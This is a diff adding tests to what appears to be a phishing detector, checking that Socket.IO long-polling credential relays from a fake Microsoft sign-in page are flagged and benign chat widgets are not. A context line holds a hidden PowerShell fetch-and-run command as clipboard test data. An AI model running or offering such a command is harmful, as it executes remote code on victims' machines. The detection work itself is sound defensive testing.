@@ -1233,6 +1233,32 @@ def test_credential_relay_websocket_fires_and_bare_socket_is_quiet():
     assert "credential_relay_websocket" not in _hits(_cap("https://chat.example/", [plain], websocket_frames=frames))  # noqa: E501
 
 
+def test_socketio_polling_relay_fires():
+    """R-05: Socket.IO falls back to (or starts in) HTTP long-polling, which never shows
+    up as WebSocket frames."""
+    brand = _page("https://m365-clone.example/", title="Sign in to your account",
+                  text="Microsoft", forms=[PASSWORD_FORM])  # noqa: E501
+    poll = "https://relay.example/socket.io/?EIO=4&transport=polling&t=Pabc"
+    har = [_req(poll, "POST", post='42["recieveid","x"]\x1e42["send_to_browser",{}]')]
+    data = _cap("https://m365-clone.example/", [brand], har=har)
+    assert "credential_relay_websocket" in _hits(data)
+    ws = build_facts(data)["websocket"]
+    assert ws["socketio_polling"] == 1
+    assert ws["polling_connections"][0]["events"] == ["recieveid", "send_to_browser"]
+
+
+def test_socketio_polling_without_a_credential_prompt_or_to_allowlisted_is_quiet():
+    poll = "https://relay.example/socket.io/?EIO=4&transport=polling"
+    chat = _page("https://chat.example/", title="Support chat", text="How can we help?")
+    assert "credential_relay_websocket" not in _hits(_cap("https://chat.example/", [chat], har=[_req(poll)]))  # noqa: E501
+    brand = _page("https://m365-clone.example/", title="Sign in to your account",
+                  text="Microsoft", forms=[PASSWORD_FORM])  # noqa: E501
+    widget = [_req("https://widget.intercom.io/socket.io/?EIO=4&transport=polling")]
+    assert "credential_relay_websocket" not in _hits(
+        _cap("https://m365-clone.example/", [brand], har=widget, allowlisted=["intercom.io"])
+    )
+
+
 def test_devtools_blocking_fires_with_context_and_is_quiet_alone():
     blocked = [{"kind": "devtools_key", "key": "F12"}, {"kind": "contextmenu"}]
     clip = [{"page": "p0", "api": "x", "text": "powershell -w hidden -c \"irm x|iex\""}]
